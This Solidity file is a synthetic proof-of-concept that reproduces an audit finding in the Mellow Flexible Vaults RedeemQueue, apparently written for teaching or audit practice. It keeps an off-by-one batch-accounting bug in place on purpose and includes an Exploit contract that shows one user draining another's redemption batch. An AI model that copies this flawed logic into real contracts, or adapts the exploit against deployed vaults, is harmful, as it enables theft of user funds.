// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Mellow Flexible Vaults — [H-2] RedeemQueue accounting mismatch between
    batch creation and claim eligibility
    (Sherlock 2025-07-mellow, #62107)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _handleReport uses upperLookupRecent(timestamp) then
    latestEligibleIndex--, excluding the last request at/before the report
    timestamp from the batch. claim() allows any request with timestamp ≤
    report price timestamp. User2 (at excluded timestamp) can claim from a
    batch funded only by User1's shares, draining the batch; User1 cannot
    claim.

    Vulnerable latestEligibleIndex-- preserved verbatim (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced RedeemQueue with mismatched batch vs claim timestamp bounds.
/// Source: RedeemQueue.sol _handleReport / claim (sherlock 2025-07-mellow).
contract RedeemQueue {
    MockERC20 public immutable asset;

    uint32[] public requestTimestamps;
    mapping(uint32 => mapping(address => uint256)) public requestShares;
    mapping(uint32 => uint256) public requestTotalShares;

    struct Batch {
        uint256 shares;
        uint256 assets;
        uint32 priceTimestamp;
        uint256 remainingShares;
    }

    Batch[] public batches;
    uint256 public batchIterator;
    uint32 public latestPriceTimestamp;
    uint256 public nextUnbatchedIndex; // first request index not yet put in a batch

    constructor(MockERC20 _asset) {
        asset = _asset;
    }

    function makeRedeem(address user, uint256 shares, uint32 ts) external {
        if (requestTimestamps.length == 0 || requestTimestamps[requestTimestamps.length - 1] != ts) {
            requestTimestamps.push(ts);
        }
        requestShares[ts][user] += shares;
        requestTotalShares[ts] += shares;
    }

    /// @dev Largest index with requestTimestamps[i] <= timestamp (or type(uint256).max if none).
    function _upperLookupRecent(uint32 timestamp) internal view returns (uint256) {
        uint256 n = requestTimestamps.length;
        if (n == 0 || requestTimestamps[0] > timestamp) return type(uint256).max;
        uint256 lo = 0;
        uint256 hi = n - 1;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            if (requestTimestamps[mid] <= timestamp) lo = mid;
            else hi = mid - 1;
        }
        return lo;
    }

    function handleReport(uint224 priceD18, uint32 timestamp) external {
        uint256 n = requestTimestamps.length;
        require(n > 0, "empty");
        uint32 latestTimestamp = requestTimestamps[n - 1];
        uint256 latestIndex = n - 1;
        uint256 latestEligibleIndex;
        if (latestTimestamp <= timestamp) {
            latestEligibleIndex = latestIndex;
        } else {
            latestEligibleIndex = _upperLookupRecent(timestamp);
            if (latestEligibleIndex == type(uint256).max) {
                return;
            }
            // Match production Checkpoints: empty/zero key aborts before decrement.
            if (latestEligibleIndex == 0) {
                // Production returns when lookup key is 0; for our ordered list,
                // index 0 still means "first request" — fall through to decrement
                // only when the production-equivalent non-zero path applies.
                // The finding's PoC uses a midpoint report where lookup is non-zero.
                return;
            }
            latestEligibleIndex--; // @> VULN: excludes the last eligible request from the batch
            // FIX: remove the line above
        }

        uint256 start = nextUnbatchedIndex;
        if (start > latestEligibleIndex) return;

        uint256 batchShares;
        for (uint256 i = start; i <= latestEligibleIndex; i++) {
            batchShares += requestTotalShares[requestTimestamps[i]];
        }
        uint256 assets_ = (batchShares * uint256(priceD18)) / 1e18;
        require(asset.transferFrom(msg.sender, address(this), assets_), "fund");

        batches.push(
            Batch({
                shares: batchShares,
                assets: assets_,
                priceTimestamp: timestamp,
                remainingShares: batchShares
            })
        );
        nextUnbatchedIndex = latestEligibleIndex + 1;
        latestPriceTimestamp = timestamp;
        batchIterator = batches.length;
    }

    function batchAt(uint256 i) external view returns (uint32 priceTs, uint256 shares) {
        Batch storage b = batches[i];
        return (b.priceTimestamp, b.shares);
    }

    function handleBatches(uint256) external {
        // Assets already transferred in handleReport (synthetic).
    }

    function claim(address receiver, uint32[] calldata timestamps) external returns (uint256 assetsOut) {
        for (uint256 t = 0; t < timestamps.length; t++) {
            uint32 ts = timestamps[t];
            uint256 shares = requestShares[ts][msg.sender];
            if (shares == 0) continue;
            // Claim eligibility uses price timestamp (≤ report ts), NOT batch membership.
            if (ts > latestPriceTimestamp) continue;
            if (batchIterator == 0) continue;

            require(batches.length > 0, "no batch");
            Batch storage b = batches[0];
            if (b.remainingShares == 0) {
                // Accounting break: batch drained by an ineligible claimer.
                revert("empty batch / div0");
            }
            uint256 claimAssets = (shares * b.assets) / b.shares;
            uint256 maxByRemaining = (b.remainingShares * b.assets) / b.shares;
            if (claimAssets > maxByRemaining) claimAssets = maxByRemaining;

            if (shares >= b.remainingShares) b.remainingShares = 0;
            else b.remainingShares -= shares;

            requestShares[ts][msg.sender] = 0;
            assetsOut += claimAssets;
            require(asset.transfer(receiver, claimAssets), "out");
        }
    }
}

contract UserClaimer {
    function doClaim(RedeemQueue q, address receiver, uint32[] calldata timestamps)
        external
        returns (uint256)
    {
        return q.claim(receiver, timestamps);
    }
}

/// @notice User2 claims from a batch that only contains User1's shares; User1 is locked out.
contract Exploit {
    MockERC20 public asset; // CREATE nonce 1
    RedeemQueue public queue; // CREATE nonce 2 — vulnerable
    UserClaimer public user1; // CREATE nonce 3
    UserClaimer public user2; // CREATE nonce 4
    UserClaimer public user3; // CREATE nonce 5

    uint256 public batch0Shares;
    uint256 public user2Received;
    uint256 public user1Received;
    bool public user1ClaimReverted;

    constructor() {
        asset = new MockERC20("ASSET");
        queue = new RedeemQueue(asset);
        user1 = new UserClaimer();
        user2 = new UserClaimer();
        user3 = new UserClaimer();
    }

    function run() external {
        uint32 redeemStart = 1_000_000;
        uint256 redeemAmount = 10_000_000;

        queue.makeRedeem(address(user1), redeemAmount, redeemStart);
        queue.makeRedeem(address(user2), redeemAmount, redeemStart + 100);
        queue.makeRedeem(address(user3), redeemAmount, redeemStart + 200);

        // Report at redeemStart+150:
        // upperLookupRecent → index of user2 (start+100) = 1
        // latestEligibleIndex-- → 0 → only user1 in batch
        asset.mint(address(this), redeemAmount);
        asset.approve(address(queue), type(uint256).max);
        queue.handleReport(uint224(1e18), redeemStart + 150);

        (, batch0Shares) = queue.batchAt(0);
        require(batch0Shares == redeemAmount, "only user1 shares in batch");
        require(asset.balanceOf(address(queue)) == redeemAmount, "queue funded once");

        // User2 claims (start+100 ≤ priceTimestamp start+150) and drains the batch.
        uint32[] memory ts2 = new uint32[](1);
        ts2[0] = redeemStart + 100;
        user2Received = user2.doClaim(queue, address(user2), ts2);
        require(user2Received == redeemAmount, "user2 drained batch");

        // User1 cannot claim — batch remaining is 0.
        uint32[] memory ts1 = new uint32[](1);
        ts1[0] = redeemStart;
        try user1.doClaim(queue, address(user1), ts1) returns (uint256 got) {
            user1Received = got;
            user1ClaimReverted = false;
        } catch {
            user1ClaimReverted = true;
            user1Received = 0;
        }
        require(user1Received == 0, "user1 got nothing");
        require(user1ClaimReverted, "user1 claim must fail");
        require(asset.balanceOf(address(user2)) == redeemAmount, "user2 holds stolen assets");
    }
}
